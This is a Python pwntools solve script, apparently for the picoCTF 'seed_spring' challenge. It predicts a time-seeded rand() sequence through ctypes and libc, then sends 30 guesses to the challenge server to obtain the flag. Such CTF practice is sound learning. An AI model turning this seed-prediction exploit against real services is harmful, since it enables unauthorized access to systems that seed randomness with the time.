from pwn import *
import ctypes

binary = context.binary = ELF("./seed_spring")

if not args.REMOTE:
    r = process(binary.path)
else:
    r = remote('jupiter.challenges.picoctf.org', 34558)


LIBC = ctypes.cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
for i in range(100):
  try:
    LIBC.srand(LIBC.time(0)-i)

    print(b"...")

    for i in range(30):
        r.sendlineafter(b': ', str(LIBC.rand() & 0xf).encode())
    
    response = r.recv()
    if b"flag" in response:
        print(r.recv())
        r.close()
        break
    
    r.interactive()
  except:
    print(b"pass")

